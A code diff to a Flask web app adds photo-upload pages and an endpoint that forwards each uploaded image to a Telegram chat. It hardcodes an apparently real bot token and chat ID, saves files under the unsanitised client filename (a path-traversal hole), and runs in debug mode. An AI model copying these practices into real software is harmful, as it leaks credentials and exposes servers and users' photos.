@@ -1,6 +1,16 @@
-from flask import Flask, render_template
+import os
+import requests
+from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
+app.config['UPLOAD_FOLDER'] = 'uploads'  # папка для временных фото
+os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
+
+# 🔐 Telegram настройки
+TELEGRAM_BOT_TOKEN = "8157630049:AAEXE8sU-Nr9I0l6FDLZxBj98NZ93kGDsMw"
+TELEGRAM_CHAT_ID = "1423772931"
+
+
 
 @app.route("/")
 def index():
@@ -29,6 +39,47 @@ def associative2():
 @app.route("/assoc3/")
 def associative3():
     return render_template("associative3.html")
+
+@app.route("/photo_upload_1/")
+def photo_upload_page1():
+    return render_template("photo_upload_1.html")  # страница с загрузкой фото
+
+@app.route("/photo_upload_2/")
+def photo_upload_page2():
+    return render_template("photo_upload_2.html")  # страница с загрузкой фото
+
+@app.route("/photo_upload_3/")
+def photo_upload_page3():
+    return render_template("photo_upload_3.html")  # страница с загрузкой фото
+
+@app.route("/upload_photo", methods=["POST"])
+def upload_photo():
+    if 'photo' not in request.files:
+        return jsonify({"success": False, "error": "No file part"})
+
+    file = request.files['photo']
+    if file.filename == '':
+        return jsonify({"success": False, "error": "No selected file"})
+
+    # Сохраняем временно
+    filepath = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
+    file.save(filepath)
+
+    # Отправляем в Telegram
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+    with open(filepath, 'rb') as photo:
+        response = requests.post(url, data={
+            'chat_id': TELEGRAM_CHAT_ID,
+        }, files={
+            'photo': photo
+        })
+
+    os.remove(filepath)  # очищаем после отправки
+
+    if response.status_code == 200:
+        return jsonify({"success": True})
+    else:
+        return jsonify({"success": False, "error": response.text})
 
 if __name__ == "__main__":
     app.run(debug=True)
